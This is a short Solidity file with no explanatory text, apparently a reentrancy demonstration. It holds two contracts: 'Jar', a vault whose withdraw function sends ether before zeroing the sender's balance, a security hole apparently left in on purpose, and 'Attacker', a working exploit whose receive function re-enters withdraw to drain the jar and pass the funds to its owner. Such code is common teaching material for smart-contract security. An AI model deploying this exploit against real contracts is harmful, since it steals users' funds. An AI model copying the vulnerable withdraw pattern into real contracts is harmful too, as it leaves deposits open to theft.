// SPDX-License-Identifier: CC-BY-4.0
pragma solidity >=0.6.12 <0.9.0;

contract Jar {
    mapping(address=>uint) public balance;
    constructor() payable {}

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balance[msg.sender] != 0, "zero balance");
        (bool s,) = msg.sender.call{ value: balance[msg.sender] }("");
        require(s, "In Jar.withdrow(), call() failed.");
        balance[msg.sender] = 0;
    }
}

contract Attacker {

    Jar public jar;
    address public owner;

    constructor(address _jar) payable {
        jar = Jar(_jar);
        owner = msg.sender;
    }

    function deposit() public {
        jar.deposit{ value: 1 ether }();
    }

    function attack() public {
        jar.withdraw();
    }

    receive() external payable {
        if (address(jar).balance >= 1 ether) {
            jar.withdraw();
        }
    }

    function withdraw() public {
        require (msg.sender == owner);
        (bool s, ) = owner.call{ value: address(this).balance}("");
        require (s);
    }
}

